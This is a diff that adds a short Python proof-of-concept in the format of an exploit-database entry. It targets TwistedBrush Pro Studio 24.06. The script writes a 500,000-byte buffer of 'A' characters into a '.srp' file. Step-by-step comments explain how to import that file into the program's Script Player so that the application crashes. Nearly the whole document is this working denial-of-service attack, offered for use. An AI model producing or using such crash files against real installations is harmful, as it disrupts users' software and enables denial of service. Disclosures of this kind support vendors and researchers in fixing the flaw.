@@ -1,0 +1,20 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: TwistedBrush Pro Studio 24.06 - '.srp' Denial of Service (PoC)
+# Date: 13/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.pixarra.com
+# Software Link http://www.pixarra.com/uploads/9/4/6/3/94635436/tbrusha.exe
+# Version: 24.06
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "TwistedBrush_player.py", it will create a new file "sample.srp"
+# 2.- Open TwistedBrush Pro Studio
+# 3.- Go to 'Record' > 'Script Player...' 
+# 4.- Click 'Import' button, select the 'sample.srp' file created and click 'Open' button
+# 5.- Crashed
+
+buffer = "\x41" * 500000
+f = open ("sample.srp", "w")
+f.write(buffer)
+f.close()
